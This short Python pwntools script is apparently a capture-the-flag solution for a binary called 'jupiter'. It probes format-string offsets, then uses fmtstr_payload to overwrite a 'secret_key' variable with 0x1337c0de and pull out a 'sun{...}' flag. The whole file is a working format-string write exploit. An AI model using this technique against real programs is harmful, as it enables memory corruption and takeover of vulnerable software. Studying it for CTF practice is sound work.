#!/usr/bin/python3
from pwn import *
import re

elf = context.binary = ELF('./jupiter')
#context.log_level =  'error'

#for i in range(100):
#    io = process()
#    payload = f'AAAAAAAA%{i}$p'
#    io.sendline(payload)
#    print(io.recvall(),i)

io = process()
payload = fmtstr_payload(5,{elf.sym.secret_key:0x1337c0de})
io.sendline(payload)
flag = re.search(b'sun{.*?}',io.recvall())
log.success(f"flag: {flag.group(0).decode()}")
